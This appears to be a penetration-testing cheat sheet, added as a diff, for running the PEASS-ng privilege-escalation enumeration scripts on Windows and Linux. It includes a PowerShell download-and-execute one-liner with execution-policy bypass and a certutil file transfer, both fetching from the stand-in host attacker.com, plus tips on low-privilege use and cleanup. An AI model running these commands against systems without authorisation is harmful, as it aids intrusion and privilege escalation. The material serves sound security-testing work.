@@ -1,0 +1,57 @@
+# ================= PEASS-ng =================
+# Description:
+# PEASS-ng is a comprehensive suite of scripts and binaries for finding privilege escalation vectors on Windows, Linux, and macOS.
+
+# Repository:
+# https://github.com/carlospolop/PEASS-ng
+
+# ---------------- DOWNLOAD ----------------
+# Clone the repo:
+git clone https://github.com/carlospolop/PEASS-ng.git
+cd PEASS-ng
+
+# For Windows (download binary):
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
+
+# For Linux:
+chmod +x linpeas.sh
+./linpeas.sh
+
+# ---------------- WINDOWS USAGE ----------------
+# Run winPEASx64 binary:
+winPEASx64.exe
+
+# Run with specific verbosity or checks:
+winPEASx64.exe quiet services users
+
+# Run from PowerShell:
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/winPEAS.ps1')"
+
+# Colorful version (console with ANSI support):
+winPEASx64.exe color
+
+# ---------------- LINUX USAGE ----------------
+# Make script executable:
+chmod +x linpeas.sh
+
+# Run with sudo for extended checks:
+sudo ./linpeas.sh
+
+# Run with output logging:
+./linpeas.sh | tee result.txt
+
+# ---------------- TIPS ----------------
+# Transfer winPEAS/linPEAS using certutil (Windows):
+certutil -urlcache -f http://attacker.com/winPEASx64.exe win.exe
+
+# Recommended to run from low-privileged user context
+# Focus on "[+] Interesting" sections in output
+# Combine with manual inspection or other tools (like LinEnum or Seatbelt)
+
+# ---------------- CLEANUP ----------------
+# Windows:
+del winPEASx64.exe
+
+# Linux:
+rm linpeas.sh result.txt
